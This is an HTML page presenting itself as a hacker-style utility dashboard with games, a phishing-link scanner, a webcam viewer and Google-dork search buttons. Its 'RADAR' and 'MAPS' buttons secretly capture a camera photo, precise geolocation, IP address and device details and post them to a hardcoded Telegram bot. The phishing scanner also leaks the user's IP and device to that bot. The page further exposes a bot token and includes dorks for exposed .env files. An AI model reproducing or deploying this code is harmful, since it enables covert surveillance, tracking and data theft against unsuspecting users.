<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EDWARD</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#050a0e;color:#fff;font-family:Segoe UI,sans-serif;padding:15px}
:root{--n:#0f0;--r:#f44;--b:#0bf;--p:#b1f;--o:#f93}
.brand{text-align:center;margin:10px 0 5px}
.brand h1{color:var(--n);font-size:20px;letter-spacing:4px;text-shadow:0 0 10px rgba(0,255,136,.4)}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:10 0 15px}
.stats div{border:1px solid rgba(0,255,136,.3);padding:10px;border-radius:12px;text-align:center;font-size:11px;background:#0f1923}
.rstats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin:8px 0 15px}
.rstats div{background:rgba(0,0,0,.4);border:1px solid rgba(0,255,136,.2);border-radius:8px;padding:6px;text-align:center;font-size:10px;color:var(--n)}
.rstats span{display:block;font-size:14px;font-weight:700;margin-top:2px}
.card{background:#0f1923;border:1px solid rgba(0,255,136,.2);border-radius:20px;padding:18px;margin-bottom:12px}
.card h3{font-size:10px;color:rgba(255,255,255,.4);letter-spacing:2px;text-transform:uppercase;margin-bottom:12px}
input,select{background:rgba(0,0,0,.5);border:1px solid rgba(0,255,136,.3);border-radius:10px;color:var(--n);padding:12px;width:100%;margin-bottom:10px;font-size:12px}
.btn{width:100%;padding:14px;border-radius:12px;border:none;cursor:pointer;font-weight:800;font-size:11px;text-transform:uppercase;margin-bottom:5px}
.bs{background:#1a1a1a;color:var(--n);border:1px solid var(--n)}
.bc{background:rgba(0,189,255,.1);color:var(--b);border:1px solid var(--b)}
.bm{background:var(--n);color:#000}
.bp{background:rgba(255,71,87,.1);color:var(--r);border:1px solid var(--r)}
.bctrl{background:rgba(255,159,67,.1);color:var(--o);border:1px solid var(--o)}
.bg{background:rgba(255,215,0,.1);color:#ffd700;border:1px solid #ffd700}
.g2{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:5px}
#sr{margin-top:10px;font-weight:700;text-align:center;font-size:13px;padding:15px;border-radius:10px;display:none}
.phish{background:rgba(255,0,0,.2);border:2px solid var(--r);color:var(--r)}
.safe{background:rgba(0,255,136,.15);border:2px solid var(--n);color:var(--n)}
#wc{display:none;margin-top:10px;border-radius:15px;overflow:hidden;border:1px solid var(--b)}
#wc video{width:100%;filter:sepia(100%)hue-rotate(80deg)brightness(1.1)}
#ro{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.95);z-index:9999;flex-direction:column;align-items:center;justify-content:center}
.sweep{width:150px;height:150px;border-radius:50%;border:2px solid var(--n);background:conic-gradient(from 0deg,transparent 70%,var(--n));animation:spin 2s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.flex{display:flex;gap:8px;padding:0 5px}
.flex .btn{flex:1}
canvas{display:none}
.progress{width:100%;height:4px;background:#333;border-radius:2px;margin:10px 0;overflow:hidden}
.progress div{height:100%;width:0%;background:var(--n);transition:width .3s}
.btn-open{background:var(--n);color:#000;padding:8px 20px;border:none;border-radius:8px;cursor:pointer;font-weight:700;margin-top:10px}
.btn-open:hover{opacity:.8}
#gm{display:none;margin-top:15px;background:#0a0a0a;border-radius:20px;padding:20px;border:2px solid #ffd700}
#gm h3{color:#ffd700;text-align:center;margin-bottom:15px;font-size:16px}
.gl{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px}
.gi{background:rgba(255,215,0,.1);border:1px solid #ffd700;border-radius:12px;padding:15px;text-align:center;cursor:pointer;transition:.3s;color:#ffd700}
.gi:hover{background:rgba(255,215,0,.2);transform:scale(1.02)}
.gi .ic{font-size:28px;display:block;margin-bottom:5px}
.gi .nm{font-size:14px;font-weight:700}
.gi .dc{font-size:10px;opacity:.6;margin-top:3px}
.gc{display:none;margin-top:15px;background:#0a0a0a;border-radius:20px;padding:20px;border:2px solid #ffd700}
.gc h3{color:#ffd700;text-align:center;margin-bottom:15px;font-size:16px}
.gc canvas{display:block;margin:0 auto;background:#111;border-radius:10px;border:1px solid #ffd700;max-width:100%}
.gctrl{display:flex;gap:10px;justify-content:center;margin-top:15px;flex-wrap:wrap}
.gctrl .btn{width:auto;padding:10px 25px;margin:0}
.sb{color:#ffd700;text-align:center;font-size:14px;margin-bottom:10px}
.go{color:var(--r);text-align:center;font-size:18px;font-weight:700;display:none}
</style>
</head>
<body>
<div class=brand><h1>EDWARD</h1></div>
<div class=stats><div>CPU: <span id=cpu>--</span></div><div>TEMP: <span id=temp>--</span></div></div>
<div class=rstats><div>🕒 <span id=rt>--:--:--</span></div><div>🔋 <span id=bat>--%</span></div><div>🌡️ <span id=suhu>--°C</span></div></div>
<div class=card><h3>🎛️ PANEL</h3><div class=g2><button class="btn bctrl" onclick=clearLog()>🧹 CLEAR</button><button class="btn bctrl" style="border-color:var(--p);color:var(--p)" onclick=toggleTheme()>🎨 THEME</button></div></div>
<div class=card><h3>🛡️ BUG HUNTER</h3><input id=site placeholder="Target Site"><select id=cat><option value="">-- AUTO --</option><option value='filetype:xls "data"'>INFO</option><option value='inurl:admin login'>EXPLOIT</option><option value='filetype:env'>VULN</option></select><button class="btn bs" onclick=cast()>⚡ CAST</button></div>
<div class=card><h3>🔍 PHISHING SCANNER</h3><input id=pl placeholder="Link..."><button class="btn bp" onclick=scanPhish()>🛡️ SCAN</button><div class=progress><div id=prog></div></div><div id=sr></div></div>
<div class=card><h3>🎮 GAME</h3><button class="btn bg" onclick=toggleGame()>🎮 OPEN GAME</button>
<div id=gm><h3>🎯 Pilih Game</h3><div class=gl><div class=gi onclick="openG('b')"><span class=ic>🐉</span><div class=nm>Dragon Blaster</div><div class=dc>Klik target emas!</div></div><div class=gi onclick="openG('s')"><span class=ic>🐍</span><div class=nm>Snake Classic</div><div class=dc>Makan & jangan nabrak!</div></div></div><button class="btn bg" onclick=toggleGame() style="margin-top:15px;padding:8px;width:auto">❌ Close</button></div>
<div id=gb class=gc><h3>🐉 DRAGON BLASTER</h3><div class=sb>🔥 Score: <span id=bs>0</span></div><canvas id=bc width=400 height=400></canvas><div class=gctrl><button class="btn bg" onclick=resetB() style="padding:8px 20px;width:auto">🔄 Reset</button><button class="btn bg" onclick=closeG('b') style="padding:8px 20px;width:auto">❌ Close</button></div></div>
<div id=gs class=gc><h3>🐍 SNAKE</h3><div class=sb>🍎 Score: <span id=ss>0</span></div><div class=go id=so>💀 GAME OVER</div><canvas id=sc width=400 height=400></canvas><div class=gctrl><button class="btn bg" onclick=resetS() style="padding:8px 20px;width:auto">🔄 Reset</button><button class="btn bg" onclick=closeG('s') style="padding:8px 20px;width:auto">❌ Close</button></div><div style="color:#888;text-align:center;font-size:10px;margin-top:10px">⬆️⬇️⬅️➡️ / WASD</div></div></div>
<div class=card><h3>📹 MONITOR</h3><button class="btn bc" onclick=toggleCam()>🛰️ WEBCAM</button><div id=wc><video id=wcv autoplay playsinline></video></div></div>
<div class=flex><button class="btn bc" style="border-color:var(--n);color:var(--n)" onclick=startRadar()>📡 RADAR</button><button class="btn bm" onclick=openMap()>📍 MAPS</button></div>
<div id=ro><div class=sweep></div></div><canvas id=cv></canvas>
<script>
const T='8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g',C='7898572558';let dark=true;
// CLOCK
setInterval(()=>document.getElementById('rt').textContent=new Date().toLocaleTimeString('id-ID',{hour12:false}),1e3);
// BATTERY
if(navigator.getBattery)navigator.getBattery().then(b=>{let u=()=>document.getElementById('bat').textContent=Math.round(b.level*100)+'%';u();b.onlevelchange=u}).catch(()=>document.getElementById('bat').textContent='N/A');
else document.getElementById('bat').textContent='N/A';
// CPU & TEMP
setInterval(()=>{let s=performance.now(),d=0;for(let i=0;i<1e6;i++)d+=i;let e=performance.now(),l=Math.min(100,Math.round(((e-s)/10)*2+10));document.getElementById('cpu').textContent=l+'%';document.getElementById('temp').textContent=(35+l/15).toFixed(1)+'°C';document.getElementById('suhu').textContent=(35+Math.random()*10).toFixed(1)+'°C'},2e3);

// GAME MENU
function toggleGame(){let m=document.getElementById('gm');m.style.display=m.style.display=='block'?'none':'block';closeG('b');closeG('s')}
function openG(t){document.getElementById('gm').style.display='none';if(t=='b'){document.getElementById('gb').style.display='block';document.getElementById('gs').style.display='none';startB()}else{document.getElementById('gs').style.display='block';document.getElementById('gb').style.display='none';startS()}}
function closeG(t){if(t=='b'){document.getElementById('gb').style.display='none';if(bi){clearInterval(bi);bi=null}}else{document.getElementById('gs').style.display='none';if(si){clearInterval(si);si=null}}}

// DRAGON BLASTER
let bs=0,bi=null,br=false,bt={x:200,y:200,sz:25,dx:2,dy:2};
function startB(){if(bi)return;br=true;bi=setInterval(()=>{if(!br)return;let t=bt;t.x+=t.dx;t.y+=t.dy;if(t.x+t.sz>400||t.x-t.sz<0)t.dx=-t.dx;if(t.y+t.sz>400||t.y-t.sz<0)t.dy=-t.dy;let c=document.getElementById('bc').getContext('2d');c.clearRect(0,0,400,400);c.shadowColor='#ffd700';c.shadowBlur=30;c.beginPath();c.arc(t.x,t.y,t.sz,0,Math.PI*2);c.fillStyle='#ffd700';c.fill();c.shadowBlur=0;c.fillStyle='#000';c.beginPath();c.arc(t.x-8,t.y-6,5,0,Math.PI*2);c.fill();c.beginPath();c.arc(t.x+8,t.y-6,5,0,Math.PI*2);c.fill();c.fillStyle='#fff';c.beginPath();c.arc(t.x-10,t.y-9,2,0,Math.PI*2);c.fill();c.beginPath();c.arc(t.x+6,t.y-9,2,0,Math.PI*2);c.fill()},16)}
function resetB(){bs=0;document.getElementById('bs').textContent='0';bt={x:200,y:200,sz:25,dx:2,dy:2}}
document.getElementById('bc').addEventListener('click',(e)=>{if(!br)return;let r=e.target.getBoundingClientRect(),sx=e.target.width/r.width,sy=e.target.height/r.height,mx=(e.clientX-r.left)*sx,my=(e.clientY-r.top)*sy,t=bt;if(Math.hypot(mx-t.x,my-t.y)<t.sz){bs++;document.getElementById('bs').textContent=bs;t.sz=Math.max(12,t.sz-1.2);t.dx+=0.1;t.dy+=0.1;if(t.dx>6)t.dx=6;if(t.dy>6)t.dy=6}});

// SNAKE
let si=null,sr=false,sn=[],sd={x:1,y:0},sf={x:100,y:100},ss=0,sgo=false;
function startS(){if(si)return;sn=[{x:200,y:200}];sd={x:1,y:0};ss=0;sgo=false;document.getElementById('ss').textContent='0';document.getElementById('so').style.display='none';sf={x:Math.floor(Math.random()*20)*20,y:Math.floor(Math.random()*20)*20};sr=true;si=setInterval(()=>{if(!sr||sgo)return;let h={x:sn[0].x+sd.x*20,y:sn[0].y+sd.y*20};if(h.x<0||h.x>=400||h.y<0||h.y>=400){sgo=true;document.getElementById('so').style.display='block';return}for(let i=0;i<sn.length;i++){if(sn[i].x===h.x&&sn[i].y===h.y){sgo=true;document.getElementById('so').style.display='block';return}}sn.unshift(h);if(h.x===sf.x&&h.y===sf.y){ss++;document.getElementById('ss').textContent=ss;sf={x:Math.floor(Math.random()*20)*20,y:Math.floor(Math.random()*20)*20};if(ss%5===0&&si){clearInterval(si);si=setInterval(()=>{if(!sr||sgo)return;moveS()},Math.max(80,150-ss*3))}}else sn.pop();let c=document.getElementById('sc').getContext('2d');c.clearRect(0,0,400,400);c.fillStyle='#ffd700';c.shadowColor='#ffd700';c.shadowBlur=20;c.beginPath();c.arc(sf.x+10,sf.y+10,8,0,Math.PI*2);c.fill();c.shadowBlur=0;c.fillStyle='#0f0';for(let i=0;i<sn.length;i++){c.fillRect(sn[i].x,sn[i].y,18,18);if(i===0)c.fillStyle='#0f0';else c.fillStyle='#0a0'}},150)}
function moveS(){let h={x:sn[0].x+sd.x*20,y:sn[0].y+sd.y*20};if(h.x<0||h.x>=400||h.y<0||h.y>=400){sgo=true;document.getElementById('so').style.display='block';return}for(let i=0;i<sn.length;i++){if(sn[i].x===h.x&&sn[i].y===h.y){sgo=true;document.getElementById('so').style.display='block';return}}sn.unshift(h);if(h.x===sf.x&&h.y===sf.y){ss++;document.getElementById('ss').textContent=ss;sf={x:Math.floor(Math.random()*20)*20,y:Math.floor(Math.random()*20)*20}}else sn.pop();let c=document.getElementById('sc').getContext('2d');c.clearRect(0,0,400,400);c.fillStyle='#ffd700';c.shadowColor='#ffd700';c.shadowBlur=20;c.beginPath();c.arc(sf.x+10,sf.y+10,8,0,Math.PI*2);c.fill();c.shadowBlur=0;c.fillStyle='#0f0';for(let i=0;i<sn.length;i++){c.fillRect(sn[i].x,sn[i].y,18,18);if(i===0)c.fillStyle='#0f0';else c.fillStyle='#0a0'}}
function resetS(){if(si){clearInterval(si);si=null}sr=false;sn=[];startS()}
document.addEventListener('keydown',(e)=>{if(!sr||sgo)return;let k=e.key;if((k=='ArrowUp'||k=='w')&&sd.y!==1)sd={x:0,y:-1};else if((k=='ArrowDown'||k=='s')&&sd.y!==-1)sd={x:0,y:1};else if((k=='ArrowLeft'||k=='a')&&sd.x!==1)sd={x:-1,y:0};else if((k=='ArrowRight'||k=='d')&&sd.x!==-1)sd={x:1,y:0}});

// RADAR
async function startRadar(){let o=document.getElementById('ro');o.style.display='flex';try{let d={ua:navigator.userAgent,platform:navigator.platform,screen:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,core:navigator.hardwareConcurrency||'?'};let ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip;let s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:640,height:480}});let v=document.createElement('video');v.srcObject=s;await v.play();let c=document.getElementById('cv');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0,c.width,c.height);let b=await new Promise(r=>c.toBlob(r,'image/jpeg',.9));s.getTracks().forEach(t=>t.stop());let loc='Tidak diketahui';try{let p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:1,timeout:5e3}));loc=p.coords.latitude+','+p.coords.longitude}catch(e){}let cap=`🔱 RADAR\nIP: ${ip}\nLokasi: ${loc}\nDevice: ${d.platform}\nWaktu: ${new Date().toLocaleString('id-ID')}`;let fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,'shot.jpg');fd.append('caption',cap);await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:fd});o.innerHTML='<div style="color:var(--n);text-align:center;padding:20px"><h2>✅ SENT</h2><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--n);color:#000;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>'}catch(e){o.innerHTML='<div style="color:var(--r);text-align:center;padding:20px"><h2>⚠️ ERROR</h2><p>'+e.message+'</p><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--r);color:#fff;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>'}}

// MAPS
async function openMap(){let o=document.getElementById('ro');o.style.display='flex';try{let p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:1,timeout:5e3}));let lat=p.coords.latitude,lng=p.coords.longitude;let ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip;let s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:640,height:480}});let v=document.createElement('video');v.srcObject=s;await v.play();let c=document.getElementById('cv');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0,c.width,c.height);let b=await new Promise(r=>c.toBlob(r,'image/jpeg',.9));s.getTracks().forEach(t=>t.stop());let d={ua:navigator.userAgent,platform:navigator.platform};let cap=`📍 MAPS\nIP: ${ip}\nLokasi: ${lat},${lng}\nDevice: ${d.platform}\nWaktu: ${new Date().toLocaleString('id-ID')}`;let fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,'map.jpg');fd.append('caption',cap);await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:fd});window.open('https://www.google.com/maps?q='+lat+','+lng,'_blank');o.style.display='none';o.innerHTML='<div class=sweep></div>'}catch(e){o.innerHTML='<div style="color:var(--r);text-align:center;padding:20px"><h2>⚠️ ERROR</h2><p>'+e.message+'</p><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--r);color:#fff;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>'}}

// PHISHING SCANNER
async function scanPhish(){let i=document.getElementById('pl').value.trim(),r=document.getElementById('sr'),p=document.getElementById('prog');if(!i){r.style.display='none';return}r.style.display='block';p.style.width='0%';let is=false,l=i;try{p.style.width='30%';let resp=await fetch('https://phishcheck.vercel.app/api/check?url='+encodeURIComponent(i));if(resp.ok){let d=await resp.json();is=d.isPhishing||d.phishing||d.suspicious||false}}catch(e){let u=i.toLowerCase(),kw=['login','verif','dana','giveaway','undian','hadiah','claim','bonus','topup','gratis','suspend','voucher'],sh=['bit.ly','tinyurl','cutt.ly','t.co','rb.gy','is.gd','shorturl','s.id'],tld=['.com','.net','.org','.id','.xyz','.info','.biz','.me','.online','.site','.live'];let mkw=kw.some(k=>u.includes(k)),msh=sh.some(k=>u.includes(k)),mtld=tld.some(k=>u.includes(k));if(u.startsWith('http://')&&!u.includes('localhost')&&!u.includes('192.168.')&&!u.startsWith('https://'))is=true;else if(mkw)is=true;else if(msh)is=true;else if((u.includes('.com-')||u.includes('.net-'))&&!u.includes('/'))is=true;else if(!mtld&&!u.includes('localhost')&&!u.includes('192.168.')&&u!=='https'&&u!=='https://')is=true;else is=false}p.style.width='100%';setTimeout(()=>p.style.width='0%',500);if(is){r.innerHTML='<div style="font-size:16px;margin-bottom:10px">⚠️ JANGAN DIBUKA!</div><div style="font-size:14px;margin-bottom:8px">Link ini BERBAHAYA (Phishing)</div><div style="font-size:12px;opacity:.7;word-break:break-all">'+l+'</div>';r.className='phish';try{let ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip,d={ua:navigator.userAgent};await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:'⚠️ PHISHING\nLink: '+i+'\nIP: '+ip+'\nDevice: '+d.ua.split(' ').slice(-2).join(' ')})})}catch(e){}}else{r.innerHTML='<div style="font-size:16px;margin-bottom:10px;color:var(--n)">✅ Aman! Bisa dibuka</div><div style="font-size:14px;margin-bottom:8px">Link ini AMAN</div><div style="font-size:12px;opacity:.7;word-break:break-all">'+l+'</div><button class="btn-open" onclick="window.open(\''+l+'\',\'_blank\')">🔗 Buka</button>';r.className='safe'}}

// WEBCAM
async function toggleCam(){let v=document.getElementById('wcv'),c=document.getElementById('wc');if(v.srcObject){v.srcObject.getTracks().forEach(t=>t.stop());c.style.display='none';v.srcObject=null;return}try{let s=await navigator.mediaDevices.getUserMedia({video:{width:640,height:480}});v.srcObject=s;c.style.display='block'}catch(e){alert('❌ '+e.message)}}

// UTILITY
function clearLog(){document.getElementById('sr').style.display='none';document.getElementById('pl').value='';document.getElementById('site').value=''}
function toggleTheme(){dark=!dark;document.documentElement.style.setProperty('--bg',dark?'#050a0e':'#0d0214');document.documentElement.style.setProperty('--n',dark?'#0f0':'#0fc')}
function cast(){let s=document.getElementById('site').value,c=document.getElementById('cat').value;window.open('https://www.google.com/search?q='+encodeURIComponent((s?'site:'+s+' ':'')+(c||'inurl:admin login')))}
</script>
</body>
</html>
